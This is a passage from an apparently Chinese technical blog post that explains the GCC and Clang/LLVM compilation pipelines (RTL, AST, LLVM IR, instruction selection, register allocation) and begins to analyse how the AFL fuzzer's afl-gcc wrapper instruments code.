class="github-emoji"><span>2⃣</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/0032-20e3.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> 在RTL基础上进行<strong>底层优化</strong></p><p><span class="github-emoji"><span>⚠</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/26a0.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> 同样的，我们也可以实现基于RTL层级的Pass！</p><p><span class="github-emoji"><span>🌰</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f330.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> <code>b = a - 1</code>  ==&gt;</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">(set (reg/v:SI 59 [ b ])<br>     (plus:SI (reg/v:SI 60 [ a ]<br>              (const_int -1 [0xffffffff]))))<br></code></pre></td></tr></tbody></table></figure><ul><li>RTL中的一些优化Passes：</li></ul><table><thead><tr><th>Name</th></tr></thead><tbody><tr><td>RTL generation</td></tr><tr><td>Loop optimization</td></tr><tr><td>Jump bypassing</td></tr><tr><td>If conversion</td></tr><tr><td>Instruction combination</td></tr><tr><td>Register movement</td></tr><tr><td>Instruction scheduling</td></tr><tr><td>Register allocation</td></tr><tr><td>Final</td></tr></tbody></table><hr><p><strong>GCC生成RTL：</strong></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ gcc afl_inst_test.c -fdump-rtl-all<br>$ <span class="hljs-built_in">cat</span> afl_inst_test.c.310r.dfinish <br><br>;; Function fun (fun, funcdef_no=0, decl_uid=2248, cgraph_uid=0, symbol_order=0)<br><br>(note 1 0 4 NOTE_INSN_DELETED)<br>(note 4 1 28 2 [bb 2] NOTE_INSN_BASIC_BLOCK)<br>(insn/f 28 4 29 2 (<span class="hljs-built_in">set</span> (mem:DI (pre_dec:DI (reg/f:DI 7 sp)) [0  S8 A8])<br>        (reg/f:DI 6 bp)) <span class="hljs-string">"afl_inst_test.c"</span>:3 57 {*pushdi2_rex64}<br>     (nil))<br>(insn/f 29 28 30 2 (<span class="hljs-built_in">set</span> (reg/f:DI 6 bp)<br>        (reg/f:DI 7 sp)) <span class="hljs-string">"afl_inst_test.c"</span>:3 81 {*movdi_internal}<br>     (nil))<br>...<br></code></pre></td></tr></tbody></table></figure><h4 id="后端生成"><a href="#后端生成" class="headerlink" title="后端生成"></a>后端生成</h4><ul><li>后端为指定的目标平台生成汇编代码</li></ul><p>GCC生成目标平台汇编代码：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ gcc -S afl_inst_test.c<br>$ <span class="hljs-built_in">cat</span> afl_inst_test.s<br></code></pre></td></tr></tbody></table></figure><h3 id="2-Clang"><a href="#2-Clang" class="headerlink" title="2. Clang"></a>2. Clang</h3><h4 id="四个阶段-1"><a href="#四个阶段-1" class="headerlink" title="四个阶段"></a>四个阶段</h4><ul><li>与GCC类似，不再赘述</li></ul><h4 id="前端分析-1"><a href="#前端分析-1" class="headerlink" title="前端分析"></a>前端分析</h4><ul><li>Clang<strong>前端管线</strong>：</li></ul><p><img src="/2022/12/27/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%89%96%E6%9E%90AFL%E6%8F%92%E6%A1%A9/6.png"></p><center>图6 Clang前端流水线</center><p><strong>预处理</strong>：</p><ul><li>C/C++预处理器在<strong>词法分析之前</strong>执行，主要功能是<ul><li>展开宏</li><li>展开包含文件</li><li>根据各种以#开头的预处理器指示略去部分代码</li></ul></li></ul><hr><p><strong>词法分析：</strong></p><ul><li>处理源代码的文本输入，将语言结构分解为一组单词和标记，去除注释、空白、制表符等</li><li>clang词法分析输出结果：</li></ul><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ clang -cc1 -dump-tokens afl_inst_test.c<br>...<br></code></pre></td></tr></tbody></table></figure><p>例如，在<code>fun()</code>[Line 4-6] 函数内的if语句高亮输出是：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> <span class="hljs-string">'if'</span> [StartOfLine] [LeadingSpace]Loc=&lt;afl_inst_test.c:<span class="hljs-number">4</span>:<span class="hljs-number">2</span>&gt;<br>l_paren <span class="hljs-string">'('</span>Loc=&lt;afl_inst_test.c:<span class="hljs-number">4</span>:<span class="hljs-number">4</span>&gt;<br>identifier <span class="hljs-string">'a'</span>Loc=&lt;afl_inst_test.c:<span class="hljs-number">4</span>:<span class="hljs-number">5</span>&gt;<br>greater <span class="hljs-string">'&gt;'</span> [LeadingSpace]Loc=&lt;afl_inst_test.c:<span class="hljs-number">4</span>:<span class="hljs-number">7</span>&gt;<br>numeric_constant <span class="hljs-string">'0'</span> [LeadingSpace]Loc=&lt;afl_inst_test.c:<span class="hljs-number">4</span>:<span class="hljs-number">9</span>&gt;<br>r_paren <span class="hljs-string">')'</span>Loc=&lt;afl_inst_test.c:<span class="hljs-number">4</span>:<span class="hljs-number">10</span>&gt;<br>l_brace <span class="hljs-string">'{'</span>Loc=&lt;afl_inst_test.c:<span class="hljs-number">4</span>:<span class="hljs-number">11</span>&gt;<br><span class="hljs-keyword">return</span> <span class="hljs-string">'return'</span> [StartOfLine] [LeadingSpace]Loc=&lt;afl_inst_test.c:<span class="hljs-number">5</span>:<span class="hljs-number">3</span>&gt;<br>minus <span class="hljs-string">'-'</span> [LeadingSpace]Loc=&lt;afl_inst_test.c:<span class="hljs-number">5</span>:<span class="hljs-number">10</span>&gt;<br>identifier <span class="hljs-string">'a'</span>Loc=&lt;afl_inst_test.c:<span class="hljs-number">5</span>:<span class="hljs-number">11</span>&gt;<br>semi <span class="hljs-string">';'</span>Loc=&lt;afl_inst_test.c:<span class="hljs-number">5</span>:<span class="hljs-number">12</span>&gt;<br>r_brace <span class="hljs-string">'}'</span> [StartOfLine] [LeadingSpace]Loc=&lt;afl_inst_test.c:<span class="hljs-number">6</span>:<span class="hljs-number">2</span>&gt;<br></code></pre></td></tr></tbody></table></figure><hr><p><strong>语法分析：</strong></p><ul><li><p>将词法分析产生的标记流作为输出，输出语法树（AST）</p></li><li><p>一个AST节点表明声明、语句和类型</p></li><li><p>语法解析器接受并处理在词法阶段生成的标记序列，每当发现一组要求的标记在一起的时候，此时会生成一个AST节点</p><ul><li><p>如每当发现一个标记tok::kw_if时，就会调用<code>ParseIfStatement()</code>函数处理if语句体中的所有标记，并为它们生成所必须的孩子AST节点和一个IfStmt根节点</p></li><li><pre><code class="c">// lib/Parse/ParseStmt.cpp...  case tok::kw_if:                  // C99 6.8.4.1: if-statement    return ParseIfStatement(TrailingElseLoc);  case tok::kw_switch:              // C99 6.8.4.2: switch-statement    return ParseSwitchStatement(TrailingElseLoc);...<figure class="highlight asciidoc"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><br><span class="hljs-bullet">* </span>Clang并不在解析之后遍历AST，而是在AST节点生成过程中即时检查类型<br><br><span class="hljs-bullet">* </span>语法分析<span class="hljs-strong">**识别解析错误**</span><br><br><span class="hljs-bullet">* </span>Clang生成<span class="hljs-strong">**AST**</span>树：<br><br><span class="hljs-code">```bash</span><br><span class="hljs-code">$ clang -fsyntax-only -Xclang -ast-dump afl_inst_test.c</span><br><span class="hljs-code"># or clang -cc1 -ast-dump afl_inst_test.c [9]</span><br></code></pre></td></tr></tbody></table></figure></code></pre></li></ul></li><li><p>AST树的可视化界面：</p></li></ul><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ clang -fsyntax-only -Xclang -ast-view afl_inst_test.c<br></code></pre></td></tr></tbody></table></figure><hr><p><strong>生成LLVM IR</strong></p><ul><li><p>经过词法分析和语义分析的联合处理之后，Clang会调用<code>CodeGenAction()</code>编译<strong>AST</strong>以生成<strong>LLVM IR</strong></p></li><li><p>前端流水线结束！</p></li></ul><h4 id="中间端优化-11"><a href="#中间端优化-11" class="headerlink" title="中间端优化[11]"></a>中间端优化<sup>[11]</sup></h4><ul><li><p>LLVM中间表示IR是连接前端和后端的中枢，让LLVM能够解析多种源语言，为多种目标生成代码</p></li><li><p>前端产生IR，后端也接收IR</p></li><li><p>引入IR的出发点：<span class="github-emoji"><span>1⃣</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/0031-20e3.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> 解决不同语言源代码的差异性； <span class="github-emoji"><span>2⃣</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/0032-20e3.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> 便于生成不同平台相异的机器指令集</p><ul><li>通用性</li><li>高级IR能够让优化器轻松提炼出原始源代码的意图；低级IR让编译器能够更容易生成为特定硬件优化的代码</li></ul></li><li><p>IR的三种等价形式：</p><ul><li>驻留内存的表示（指令类等）</li><li>磁盘上以空间高效方式编码的位表示（bitcode文件）</li><li>磁盘上的人类可读文本表示（LLVM汇编文件）</li></ul></li><li><p>IR的工作流图：</p></li></ul><p><img src="/2022/12/27/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%89%96%E6%9E%90AFL%E6%8F%92%E6%A1%A9/7.png"></p><center>图7 LLVM IR工作流图</center><hr><p><strong>Clang生成IR：</strong></p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// sum.c</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">sum</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b)</span> {<br>  <span class="hljs-keyword">return</span> a+b;<br>}<br></code></pre></td></tr></tbody></table></figure><ul><li>生成bitcode：</li></ul><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ clang sum.c -emit-llvm -c -o sum.bc<br></code></pre></td></tr></tbody></table></figure><ul><li>生成汇编表示：</li></ul><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ clang sum.c -emit-llvm -S -c -o sum.ll<br></code></pre></td></tr></tbody></table></figure><ul><li>汇编LLVM IR汇编文本以生成bitcode：</li></ul><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ llvm-as sum.ll -o sum.bc<br></code></pre></td></tr></tbody></table></figure><ul><li>反编译bitcode为IR汇编：</li></ul><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ llvm-dis sum.bc -o sum.ll<br></code></pre></td></tr></tbody></table></figure><ul><li>llvm-extract工具提取IR函数、全局变量，还能从IR模块中删除全局变量：</li></ul><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ llvm-extract -func=<span class="hljs-built_in">sum</span> sum.bc -o sum-fn.bc<br></code></pre></td></tr></tbody></table></figure><h4 id="后端生成-12"><a href="#后端生成-12" class="headerlink" title="后端生成[12]"></a>后端生成<sup>[12]</sup></h4><ul><li>后端主要的步骤就是将LLVM IR转换为目标汇编代码，具体步骤如图8所示：</li></ul><p><img src="/2022/12/27/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%89%96%E6%9E%90AFL%E6%8F%92%E6%A1%A9/8.png"></p><center>图8 LLVM IR到目标汇编代码的流程</center><ul><li><p>简要描述上述代码生成的各个阶段：</p><ul><li><p><strong>指令选择</strong>（instruction selection）：</p><p><span class="github-emoji"><span>1⃣</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/0031-20e3.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> 将内存中的IR表示变换为目标特定的selectionDAG节点，每一个DAG表示单一基本块的计算</p><p>你可以使用debug版本的llc来生成selectionDAG节点信息：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ /llvm-project/build/bin/llc -debug sum.bc <span class="hljs-comment"># 这里使用debug版本的clang！</span><br>...<br>SelectionDAG has 18 nodes:<br>  t0: ch = EntryToken<br>  t6: i64 = Constant&lt;0&gt;<br>      t2: i32,ch = CopyFromReg t0, Register:i32 %0<br>    t8: ch = store&lt;ST4[%a.addr]&gt; t0, t2, FrameIndex:i64&lt;0&gt;, undef:i64<br>    t4: i32,ch = CopyFromReg t0, Register:i32 %1<br>  t10: ch = store&lt;ST4[%b.addr]&gt; t8, t4, FrameIndex:i64&lt;1&gt;, undef:i64<br>      t11: i32,ch = load&lt;LD4[%a.addr](dereferenceable)&gt; t10, FrameIndex:i64&lt;0&gt;, undef:i64<br>      t12: i32,ch = load&lt;LD4[%b.addr](dereferenceable)&gt; t10, FrameIndex:i64&lt;1&gt;, undef:i64<br>    t13: i32 = add nsw t11, t12<br>  t16: ch,glue = CopyToReg t10, Register:i32 %eax, t13<br>  t17: ch = X86ISD::RET_FLAG t16, TargetConstant:i32&lt;0&gt;, Register:i32 %eax, t16:1<br>...<br></code></pre></td></tr></tbody></table></figure><p>此外，你可以执行下面的命令来生成selectionDAG图：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ /llvm-project/build/bin/llc -view-dag-combine1-dags sum.bc -fast-isel=<span class="hljs-literal">false</span><br></code></pre></td></tr></tbody></table></figure><p><img src="/2022/12/27/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%89%96%E6%9E%90AFL%E6%8F%92%E6%A1%A9/9.png"></p><center>图9 sum函数的SelectionDAG图</center><p><span class="github-emoji"><span>2⃣</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/0032-20e3.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> 利用<strong>模式匹配</strong>将目标无关的节点转换为目标特定的节点，而指令选择的算法是局部的，每次作用SelectionDAG（基本块）的实例</p><p>可以执行一下命令生成指令选择后的SelectionDAG图：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ /llvm-project/build/bin/llc -view-sched-dags sum.bc -fast-isel=<span class="hljs-literal">false</span><br></code></pre></td></tr></tbody></table></figure><p><img src="/2022/12/27/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%89%96%E6%9E%90AFL%E6%8F%92%E6%A1%A9/10.png"></p><center>图10 指令选择后的sum函数的SelectionDAG图</center><p>由上图我们可以看到，在指令选择之后，原先DAG图中的add节点被替换成ADD32rr，X86ISD::RET_FLAG被替换为RET，load被替换为MOV32rm，store被替换为MOV32mr</p></li><li><p><strong>指令调度</strong>（instruction scheduling）：</p><ul><li>指令延迟表：根据具体硬件信息来提高指令级并行，从而提高在计算机上指令流水线的性能 [14]</li><li>风险检测与识别</li><li>调度单元</li></ul><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ /llvm-project/build/bin/llc -view-sunit-dags sum.bc -fast-isel=<span class="hljs-literal">false</span><br></code></pre></td></tr></tbody></table></figure><p><img src="/2022/12/27/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%89%96%E6%9E%90AFL%E6%8F%92%E6%A1%A9/11.png"></p><center>图11 调度单元图</center></li><li><p><strong>寄存器分配</strong>（Register allocation）</p><ul><li><p>作用在<strong>机器指令</strong>上：</p><ul><li>在指令调度之后，InstrEmitter Pass会被运行，它将<code>SDNode</code>格式转换为<code>MachineInstr</code>格式</li><li>该表示相较于IR指令更接近实际的目标指令</li></ul><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ /llvm-project/build/bin/llc -march=sparc -print-machineinstrs sum.bc<br>...<br><span class="hljs-comment"># After Instruction Selection:</span><br><span class="hljs-comment"># Machine code for function sum: IsSSA, TracksLiveness</span><br>Frame Objects:<br>  <span class="hljs-keyword">fi</span><span class="hljs-comment">#0: size=4, align=4, at location [SP]</span><br>  <span class="hljs-keyword">fi</span><span class="hljs-comment">#1: size=4, align=4, at location [SP]</span><br>Function Live Ins: %i0 <span class="hljs-keyword">in</span> %0, %i1 <span class="hljs-keyword">in</span> %1<br><br>%bb.0: derived from LLVM BB %entry<br>    Live Ins: %i0 %i1<br>%1:intregs = COPY %i1; IntRegs:%1<br>%0:intregs = COPY %i0; IntRegs:%0<br>%3:intregs = COPY %1; IntRegs:%3,%1<br>%2:intregs = COPY %0; IntRegs:%2,%0<br>STri %stack.0.a.addr, 0, %0; mem:ST4[%a.addr] IntRegs:%0<br>STri %stack.1.b.addr, 0, %1; mem:ST4[%b.addr] IntRegs:%1<br>%4:intregs = LDri %stack.0.a.addr, 0; mem:LD4[%a.addr](dereferenceable) IntRegs:%4<br>%5:intregs = LDri %stack.1.b.addr, 0; mem:LD4[%b.addr](dereferenceable) IntRegs:%5<br>%6:intregs = ADDrr killed %4, killed %5; IntRegs:%6,%4,%5<br>%i0 = COPY %6; IntRegs:%6<br>RETL 8, implicit %i0<br>...<br></code></pre></td></tr></tbody></table></figure></li><li><p><strong>基本任务：</strong>将无限数量的虚拟寄存器转换为有限的物理寄存器</p></li></ul><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ /llvm-project/build/bin/llc -print-after=greedy sum.bc<br><span class="hljs-comment"># *** IR Dump After Greedy Register Allocator ***:</span><br><span class="hljs-comment"># Machine code for function sum: NoPHIs, TracksLiveness</span><br>Frame Objects:<br>  <span class="hljs-keyword">fi</span><span class="hljs-comment">#0: size=4, align=4, at location [SP+8]</span><br>  <span class="hljs-keyword">fi</span><span class="hljs-comment">#1: size=4, align=4, at location [SP+8]</span><br>Function Live Ins: %edi <span class="hljs-keyword">in</span> %0, %esi <span class="hljs-keyword">in</span> %2<br><br>0B%bb.0: derived from LLVM BB %entry<br>    Live Ins: %edi %esi<br>16B%3:gr32 = COPY %esi; GR32:%3<br>32B%1:gr32 = COPY %edi; GR32:%1<br>80BMOV32mr %stack.0.a.addr, 1, %noreg, 0, %noreg, %1; mem:ST4[%a.addr] GR32:%1<br>96BMOV32mr %stack.1.b.addr, 1, %noreg, 0, %noreg, %3; mem:ST4[%b.addr] GR32:%3<br>112B%7:gr32 = MOV32rm %stack.0.a.addr, 1, %noreg, 0, %noreg; mem:LD4[%a.addr] GR32:%7<br>144B%7:gr32 = ADD32rm %7, %stack.1.b.addr, 1, %noreg, 0, %noreg, implicit-def dead %eflags; mem:LD4[%b.addr] GR32:%7<br>160B%eax = COPY %7; GR32:%7<br>176BRETQ implicit %eax<br><br><span class="hljs-comment"># End machine code for function sum.</span><br><br></code></pre></td></tr></tbody></table></figure><ul><li>寄存器合并器、虚拟寄存器重写和目标钩子</li></ul></li></ul></li></ul><h2 id="II-AFL如何进行插桩？"><a href="#II-AFL如何进行插桩？" class="headerlink" title="II. AFL如何进行插桩？"></a>II. AFL如何进行插桩？</h2><ul><li><p>原生AFL有<strong>两种插桩方式</strong></p><ul><li><p>基于编译器生成的汇编文件的插桩</p><ul><li>关键文件有两个，分别是<code>afl-gcc.c</code>和<code>afl-as.c</code></li><li><code>afl-gcc/g++/clang/clang++/gcj</code>：编译器（gcc、clang、gcj）的一个wrapper <span class="github-emoji"><span>➡</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/27a1.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> 编译器产生汇编文件</li><li><code>afl-as</code>：汇编器（as）的一个wrapper <span class="github-emoji"><span>➡</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/27a1.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> 对编译器产生的汇编文件进行插桩，然后调用<code>as</code>生成目标文</li></ul><p>图解：</p><p><img src="/2022/12/27/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%89%96%E6%9E%90AFL%E6%8F%92%E6%A1%A9/12.png"></p><center>图12 基于编译器的AFL插桩流程</center></li><li><p>基于LLVM模式的插桩</p><ul><li>关键文件即<code>llvm_mode</code>文件夹下的所有文件</li></ul></li></ul></li></ul><h3 id="a-基于编译器汇编文件的插桩"><a href="#a-基于编译器汇编文件的插桩" class="headerlink" title="a. 基于编译器汇编文件的插桩"></a>a. 基于编译器汇编文件的插桩</h3><h4 id="1-afl-gcc-c"><a href="#1-afl-gcc-c" class="headerlink" title="1. afl-gcc.c"></a>1. afl-gcc.c</h4><ul><li><p>是主流编译器的一个wrapper，根据具体调用的<code>afl-xxx</code>编译器名来进行分流：</p><ul><li><p><code>afl-xxx</code>编译器都是<code>afl-gcc</code>的一个软链接，如下所示</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ ll afl-gcc afl-g++ afl-clang afl-clang++<br>lrwxrwxrwx 1 chan chan     7 Nov  3 23:52 afl-clang -&gt; afl-gcc*<br>lrwxrwxrwx 1 chan chan     7 Nov  3 23:52 afl-clang++ -&gt; afl-gcc*<br>lrwxrwxrwx 1 chan chan     7 Nov  3 23:52 afl-g++ -&gt; afl-gcc*<br>-rwxrwxr-x 1 chan chan 22976 Nov  3 23:52 afl-gcc*<br></code></pre></td></tr></tbody></table></figure></li></ul></li><li><p>与<code>afl-as</code>的结合使用：使用<code>gcc/clang</code> <code>-B</code>选项来指定汇编器路径，即AFL本身的路径</p><p>换言之，<code>afl-gcc</code>本质上还是调用的原来的编译器，只不过将汇编器替换为了<code>afl-as</code>（而<code>afl-as</code>的主要作用就是进行插桩！）</p></li><li><p><strong>源码解析</strong>：</p><ul><li><p><code>find_as()</code>：在环境变量<code>AFL_PATH</code>【AFL本身的路径】提供”假的”GNU汇编器，即<code>AFL_PATH/as</code>；或者根据<code>argv[0]</code>的路径进行派生。<span class="github-emoji"><span>📓</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f4d3.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> 注：这里的<code>as</code>本身也是<code>afl-as</code>的一个软链接，如下所示：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ ll afl-as as<br>-rwxrwxr-x 1 chan chan 37544 Nov  3 23:52 afl-as*<br>lrwxrwxrwx 1 chan chan     6 Nov  3 23:52 as -&gt; afl-as*<br></code></pre></td></tr></tbody></table></figure></li><li><p><code>edit_params()</code>：构造新的命令行选项，即将<code>argv</code>中的选项拷贝到<code>cc_params</code>中，同时提供一些必要的编辑：</p><ul><li><p>首先对<code>argv[0]</code>进行匹配，即进行分流：</p><p><code>afl-clang</code> =&gt; <code>clang</code>; </p><p><code>afl-clang++</code> =&gt; <code>clang++</code>; </p><p><code>afl-g++</code> =&gt; <code>g++</code>; </p><p><code>afl-gcj</code> =&gt; <code>gcj</code>; </p><p><code>afl-gcc</code> =&gt; <code>gcc</code></p></li><li><p>然后将<code>argv</code>中其他的选项拷贝到<code>cc_params</code>，在这过程中，对一些选项进行处理：</p><ul><li><code>-B</code>将被覆写</li><li><code>-integrated-as</code>、<code>-pipe</code>、将被删除</li><li>如果遇到<code>-fsanitize=address</code>或<code>-fsanitize=memory</code>时，将<code>asan_set</code>标志变量设置为1，将选项添加到<code>cc_params</code></li><li>如果遇到<code>FORTIFY_SOURCE</code>设置项，则将<code>fortify_set</code>标志变量设置为1，将选项添加到<code>cc_params</code>  <em># 编译器的一种安全检测机制，防溢出</em></li></ul></li><li><p>然后添加-B选项，即<code>-B as_path</code>，<code>as_path</code>为<code>find_as()</code>函数设置的汇编器路径。接着进行5个判断：</p><ul><li><p>如果是<code>clang_mode</code>，添加<code>-no-integrated-as</code>选项以避免使用clang集成的汇编器</p></li><li><p>如果设置了环境变量<code>AFL_HARDEN</code>，则添加 <code>-fstack-protector-all</code> [15] 和 <code>-D_FORTIFY_SOURCE=2</code></p></li><li><p>如果<code>asan_set == 1</code>，则将环境变量<code>AFL_USE_ASAN</code>设置为1；否则，判断是否设置了<code>AFL_USE_ASAN</code>或<code>AFL_USE_MSAN</code>，并检查相应的互斥性和添加相应的选项（<code>-U_FORTIFY_SOURCE</code> 和 <code>-fsanitize=address/memory</code>）</p></li><li><p>如果设置了环境变量<code>AFL_DONT_OPTIMIZE</code>，那么将不进行优化操作，否则将添加下述选项：</p><table><thead><tr><th>选项</th><th>含义</th></tr></thead><tbody><tr><td>-g</td><td>全局绑定，主要用于debug</td></tr><tr><td>-O3</td><td>O3级优化</td></tr><tr><td>-funroll-loops</td><td>避免优化器展开循环，其主要目的有两个：<br><span class="github-emoji"><span>1⃣</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/0031-20e3.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> 便于对循环体的边进行跟踪<br><span class="github-emoji"><span>2⃣</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/0032-20e3.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> 避免循环体内其他边的数量爆炸（循环展开后会产生冗余边）</td></tr><tr><td>-D__AFL_COMPILER=1</td><td># 不是编译器本身的选项<br>在ChangeLog中，该变量用来指示该程序是在afl-gcc / afl-clang / afl-clang-fast下构建的，并且允许自定义的优化</td></tr><tr><td>-DFUZZING_BUILD_MODE_UNSAFE_FOR_PRODUCTION=1</td><td>-</td></tr></tbody></table></li><li><p>如果设置了环境变量<code>AFL_NO_BUILTIN</code>，那么将不进行相关函数的内置替换（即汇编处将使用<code>call</code>相关函数，对于<code>AFL插桩</code>来说，这将引入额外的开销，因此默认进行<code>builtin</code>）。具体来说，通过添加下述选项来实现：</p><table><thead><tr><th align="center">选项</th></tr></thead><tbody><tr><td align="center">-fno-builtin-strcmp</td></tr><tr><td align="center">-fno-builtin-strncmp</td></tr><tr><td align="center">-fno-builtin-strcasecmp</td></tr><tr><td align="center">-fno-builtin-strncasecmp</td></tr><tr><td align="center">-fno-builtin-memcmp</td></tr><tr><td align="center">-fno-builtin-strstr</td></tr><tr><td align="center">-fno-builtin-strcasestr</td></tr></tbody></table></li></ul></li></ul></li><li><p><code>execvp()</code>：执行构造的命令行，即<code>cc_params</code>。该命令行将调用编译器生成相应的可执行文件，正如前所述，<code>-B</code>指定了<code>afl</code>的汇编器进行插桩操作，因此下面我们将详细介绍<code>afl-as.c</code>的具体流程。</p></li></ul></li></ul><h4 id="2-afl-as-c"><a href="#2-afl-as-c" class="headerlink" title="2. afl-as.c"></a>2. 